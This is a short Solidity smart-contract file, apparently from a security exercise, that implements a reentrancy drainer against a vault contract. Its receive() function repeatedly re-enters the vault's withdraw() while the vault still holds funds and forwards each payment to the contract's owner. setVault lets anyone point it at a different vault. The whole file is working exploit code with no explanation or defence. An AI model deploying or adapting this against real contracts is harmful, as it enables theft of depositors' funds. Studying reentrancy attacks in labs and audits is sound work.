// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IVaultReentrancyAttack} from "../interfaces/IVaultReentrancyAttack.sol";

contract ReentrancyDrainer {
    error DepositCallReverted();
    error TransferETHToOwnerReverted();

    IVaultReentrancyAttack public vault;
    address public immutable owner;

    constructor(address vaultAddress) {
        vault = IVaultReentrancyAttack(vaultAddress);
        owner = msg.sender;
    }

    function deposit() external payable {
        (bool success, ) = address(vault).call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        if (!success) {
            revert DepositCallReverted();
        }
    }

    function withdraw() external {
        vault.withdraw();
    }

    receive() external payable {
        if (vault.balance() > 0) {
            vault.withdraw();
        }
        (bool success, ) = address(owner).call{value: msg.value}("");
        if (!success) {
            revert TransferETHToOwnerReverted();
        }
    }

    function setVault(address newVault) external {
        vault = IVaultReentrancyAttack(newVault);
    }
}
